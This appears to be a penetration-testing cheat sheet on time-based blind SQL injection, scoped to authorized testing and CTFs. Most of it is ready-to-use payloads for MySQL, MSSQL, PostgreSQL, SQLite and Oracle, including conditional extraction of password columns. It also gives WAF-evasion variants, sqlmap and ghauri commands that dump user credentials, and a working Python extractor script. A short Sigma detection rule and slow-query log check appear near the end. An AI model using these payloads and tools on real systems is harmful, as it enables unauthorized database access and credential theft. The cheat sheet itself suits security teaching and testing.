# Slow / Time-Based Blind SQL Injection Techniques

**Scope:** authorized penetration testing, CTF, and defensive security research.
Use when error-based and boolean-based blind injection are blocked or return no
differentiable output. Time-based injection is the last resort — slow, detectable,
but often the only working channel.

---

## 1. When to Use Time-Based Injection

Use time-based / heavy-query injection when:
- Error messages are suppressed (`display_errors = Off`, generic 500 pages)
- Boolean-blind produces identical responses (same body, same length, same status)
- Out-of-band (DNS/HTTP callback) is blocked by firewall egress rules
- The application returns cached responses that make boolean-blind unreliable

Time-based injection works by measuring the **delta in response time** between
a payload that forces the DB to sleep and one that does not. A 5-second sleep
delta = confirmed injection even with zero visible output.

---

## 2. MySQL — SLEEP() and BENCHMARK()

### 2a. SLEEP() — the standard approach
```sql
-- Confirm injection (if response delays ~5 seconds → vulnerable)
' AND SLEEP(5)--
' OR SLEEP(5)--
1' AND SLEEP(5) AND '1'='1
1 AND SLEEP(5)

-- In a numeric context (no quotes needed)
id=1 AND SLEEP(5)

-- Inside a subquery (bypasses some WAFs that scan top-level SLEEP)
' AND (SELECT SLEEP(5))--
' AND (SELECT 1 FROM (SELECT SLEEP(5)) t)--
```

### 2b. SLEEP() with conditional exfiltration
```sql
-- Confirm first char of version is '8' (sleeps if true, fast if false)
' AND IF(SUBSTRING(@@version,1,1)='8', SLEEP(5), 0)--

-- Exfiltrate database name char by char
' AND IF(ASCII(SUBSTRING(database(),1,1))>64, SLEEP(5), 0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))=109, SLEEP(5), 0)-- -- (109='m')

-- Exfiltrate table name
' AND IF((SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables
          WHERE table_schema=database() LIMIT 0,1)='u', SLEEP(5), 0)--

-- Full row exfil (binary search — cuts requests in half)
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>100,
         SLEEP(5), 0)--
```

### 2c. BENCHMARK() — alternative when SLEEP() is filtered
```sql
-- BENCHMARK(N, expr) executes expr N times — causes CPU-based delay
' AND BENCHMARK(5000000, MD5('a'))--
' OR BENCHMARK(8000000, SHA1(1))--

-- Conditional BENCHMARK
' AND IF(1=1, BENCHMARK(5000000, MD5('a')), 0)--
' AND IF(SUBSTRING(database(),1,1)='t', BENCHMARK(6000000,MD5(1)), 0)--
```

### 2d. Heavy UNION SELECT (causes I/O delay on large tables)
```sql
-- Force a cross join on large information_schema tables (I/O heavy)
' UNION SELECT 1,2,3 FROM information_schema.columns a,
  information_schema.columns b,
  information_schema.columns c--
-- WARNING: can cause DoS on small servers — use judiciously
```

---

## 3. MSSQL — WAITFOR DELAY

### 3a. Basic WAITFOR
```sql
-- Confirm injection
'; WAITFOR DELAY '0:0:5'--
1; WAITFOR DELAY '0:0:5'--
' AND 1=1; WAITFOR DELAY '0:0:5'--

-- Works in stacked queries (requires multiple statement support)
' ; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### 3b. Conditional WAITFOR for data exfiltration
```sql
-- Check first char of DB version
'; IF (SUBSTRING(@@VERSION,1,1)='M') WAITFOR DELAY '0:0:5'--

-- Exfiltrate DB name
'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))>64) WAITFOR DELAY '0:0:5'--
'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))=109) WAITFOR DELAY '0:0:5'--

-- Check if user is sysadmin (is_srvrolemember)
'; IF (IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:5'--

-- Enumerate tables
'; IF ((SELECT TOP 1 SUBSTRING(name,1,1) FROM sysobjects 
        WHERE xtype='U' ORDER BY name)='u') WAITFOR DELAY '0:0:5'--
```

### 3c. MSSQL via linked servers (chained delay)
```sql
-- Delay via linked server query (confirms linked server access too)
'; EXEC ('WAITFOR DELAY ''0:0:5''') AT [linked_server_name]--
```

---

## 4. PostgreSQL — pg_sleep() and Heavy Queries

### 4a. pg_sleep()
```sql
-- Basic
'; SELECT pg_sleep(5)--
' AND (SELECT pg_sleep(5)) IS NOT NULL--
' OR 1=1 AND (SELECT pg_sleep(5))--

-- Conditional (PostgreSQL uses CASE instead of IF)
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (SUBSTRING(version(),1,10)='PostgreSQL')
               THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Exfiltrate DB name char by char
'; SELECT CASE WHEN (ASCII(SUBSTRING(current_database(),1,1))=112)
               THEN pg_sleep(5) ELSE pg_sleep(0) END--
-- 112 = 'p' in ASCII
```

### 4b. Heavy query (no sleep function needed — CPU-based)
```sql
-- Large generate_series cross join
'; SELECT COUNT(*) FROM generate_series(1,10000000)--
-- Adjust the number based on observed latency

-- Combine with conditional
'; SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM generate_series(1,5000000))
               ELSE 1 END--
```

### 4c. PostgreSQL copy_to for OOB + time confirmation
```sql
'; COPY (SELECT pg_sleep(5)) TO '/dev/null'--
```

---

## 5. SQLite — randomblob() Heavy Computation

SQLite has no `SLEEP()` function. Use CPU-intensive operations instead:

```sql
-- randomblob(N) generates N random bytes — large N = CPU delay
' AND randomblob(500000000)--  -- ~5 seconds on typical hardware
' AND 1=1 AND randomblob(500000000)--

-- Conditional randomblob
' AND CASE WHEN (1=1) THEN randomblob(500000000) ELSE 0 END--
' AND CASE WHEN (SUBSTR(sqlite_version(),1,1)='3')
           THEN randomblob(500000000) ELSE 0 END--

-- Exfiltrate
' AND CASE WHEN (UNICODE(SUBSTR((SELECT password FROM users LIMIT 0,1),1,1))>64)
           THEN randomblob(500000000) ELSE 0 END--

-- Alternatively: LIKE with large string (slower but avoids functions)
' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))))--
```

---

## 6. Oracle — dbms_pipe.receive_message() and Heavy Queries

```sql
-- Standard Oracle time delay (requires execute on dbms_pipe — DBA by default)
'; BEGIN dbms_pipe.receive_message(('a'),5); END;--
' AND 1=(SELECT 1 FROM DUAL WHERE dbms_pipe.receive_message('a',5)=1)--

-- Alternative: ORDSYS.ORD_DICOM.getmappingxsl (doesn't need DBA)
'; SELECT ORDSYS.ORD_DICOM.getmappingxsl() FROM DUAL--

-- Heavy query (works without special privs)
'; SELECT COUNT(*) FROM all_objects, all_objects--
-- Cross join of all_objects with itself is O(n²) — causes measurable delay

-- Conditional heavy query
'; SELECT CASE WHEN (1=1)
               THEN (SELECT COUNT(*) FROM all_objects, all_objects)
               ELSE 1 END FROM DUAL--
```

---

## 7. WAF Evasion for Time-Based Payloads

### 7a. Comment injection / whitespace substitution
```sql
-- MySQL: replace spaces and keywords with comments
'/**/AND/**/SLEEP(5)--
' AND/**/SLEEP/*comment*/(5)--
'/*!50000AND*/SLEEP(5)--
' AND SLEEP/**/(5)--

-- MSSQL: inline comments
'; WAITFOR/**/DELAY/**/'0:0:5'--
'; WAIT%09FOR%09DELAY%09'0:0:5'--   -- tab character
```

### 7b. Encoding variations
```sql
-- URL encoding
%27%20AND%20SLEEP(5)--
%27%20AND%20SLEEP%28%35%29--

-- Double URL encoding (bypass mod_security)
%2527%2520AND%2520SLEEP%285%29--

-- Unicode normalization bypass
' AND SLEEP（5）--   -- U+FF08 FULLWIDTH LEFT PARENTHESIS
```

### 7c. Case mutation
```sql
' aNd SlEeP(5)--
' AND sLeEp(5)--
' AnD bEnChmArK(5000000,Md5(1))--
```

### 7d. Chunked transfer encoding (bypass body inspection)
```bash
# Send payload in chunked pieces — WAF may not reassemble for inspection
curl -sk -X POST "https://target.com/search" \
  -H "Transfer-Encoding: chunked" \
  --data-urlencode "q=' AND SLEEP(5)--"
```

### 7e. HTTP parameter pollution
```bash
# Some WAFs check only the first or last occurrence of a parameter
curl -sk "https://target.com/search?q=normal&q='+AND+SLEEP(5)--"
curl -sk "https://target.com/search?q='+AND+SLEEP(5)--&q=normal"
```

### 7f. Nested functions (bypass keyword-level WAF)
```sql
-- SLEEP nested inside another function call
' AND (SELECT*FROM(SELECT(SLEEP(5)))a)--
' AND EXP(~(SELECT*FROM(SELECT SLEEP(5))x))--
' AND UPDATEXML(1,(SELECT SLEEP(5)),1)--  -- triggers XML error + sleep
```

---

## 8. sqlmap — Time-Based Mode

```bash
# Force time-based blind only (skip other techniques)
sqlmap -u "https://target.com/search?q=1" --technique=T --level=3 --risk=2

# Increase time threshold (useful for high-latency targets)
sqlmap -u "https://target.com/search?q=1" --technique=T --time-sec=10

# With POST data
sqlmap -u "https://target.com/login" --data="user=admin&pass=1" \
  --technique=T --level=5 --risk=3

# Specify DB type to reduce noise
sqlmap -u "https://target.com/q?id=1" --technique=T --dbms=mysql

# Use a tamper script for WAF bypass
sqlmap -u "https://target.com/q?id=1" --technique=T \
  --tamper="space2comment,randomcase,between"

# Extract data once injection is confirmed
sqlmap -u "https://target.com/q?id=1" --technique=T \
  --dbs --dump -T users -C username,password
```

---

## 9. ghauri — Time-Based Mode (sqlmap Alternative)

```bash
# ghauri: modern sqlmap alternative with better WAF bypass
git clone https://github.com/r0oth3x49/ghauri
pip install -r requirements.txt

# Time-based only
python ghauri.py -u "https://target.com/q?id=1" --technique=T

# With custom delay threshold
python ghauri.py -u "https://target.com/q?id=1" --technique=T --time-sec=8

# POST
python ghauri.py -u "https://target.com/login" --data="q=1" --technique=T

# WAF evasion mode
python ghauri.py -u "https://target.com/q?id=1" --technique=T --level=3
```

---

## 10. Manual Binary Search Script (Python)

Automate time-based exfiltration without sqlmap (for stealth / custom scenarios):

```python
#!/usr/bin/env python3
"""Binary search time-based SQLi extractor — MySQL/SLEEP example."""
import requests
import time

TARGET = "https://target.com/search"
PARAM  = "q"
SLEEP  = 3          # seconds — adjust to target latency
THRESH = SLEEP * 0.7  # 70% of sleep = definite delay

def is_true(payload: str) -> bool:
    """Returns True if the injected condition caused a delay."""
    start = time.time()
    try:
        requests.get(TARGET, params={PARAM: payload}, timeout=SLEEP + 5)
    except requests.exceptions.Timeout:
        return True
    return (time.time() - start) >= THRESH

def extract_char(query: str, position: int) -> str:
    """Binary search over ASCII 32-127 for one character."""
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        payload = (
            f"' AND IF(ASCII(SUBSTRING(({query}),{position},1))>{mid},"
            f"SLEEP({SLEEP}),0)-- "
        )
        if is_true(payload):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if 32 <= lo <= 126 else '?'

def extract_string(query: str, max_len: int = 32) -> str:
    result = ""
    for i in range(1, max_len + 1):
        ch = extract_char(query, i)
        if ch == '?':
            break
        result += ch
        print(f"\r[*] {result}", end="", flush=True)
    print()
    return result

if __name__ == "__main__":
    print("[+] Extracting database name...")
    db = extract_string("SELECT database()")
    print(f"[+] Database: {db}")

    print("[+] Extracting first username...")
    user = extract_string("SELECT username FROM users LIMIT 0,1")
    print(f"[+] User: {user}")
```

---

## 11. Detection and Defensive Signatures

```yaml
# Sigma rule — time-based SQLi patterns in web logs
title: Time-Based SQL Injection Attempt
status: experimental
logsource:
  category: webserver
detection:
  keywords:
    - 'SLEEP('
    - 'WAITFOR DELAY'
    - 'pg_sleep'
    - 'randomblob'
    - 'BENCHMARK('
    - 'dbms_pipe'
  condition: keywords
level: high
```

```bash
# Monitor for slow query indicators in MySQL
# my.cnf
slow_query_log = 1
slow_query_log_file = /var/log/mysql/slow.log
long_query_time = 3   # log queries taking > 3 seconds
log_queries_not_using_indexes = 1

# Review slow log for SLEEP/BENCHMARK
grep -E "SLEEP|BENCHMARK|WAITFOR" /var/log/mysql/slow.log
```

---

## References

- sqlmap documentation: https://sqlmap.org
- ghauri: https://github.com/r0oth3x49/ghauri
- PortSwigger blind SQLi guide: https://portswigger.net/web-security/sql-injection/blind
- PayloadsAllTheThings time-based: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#time-based-blind-sql-injection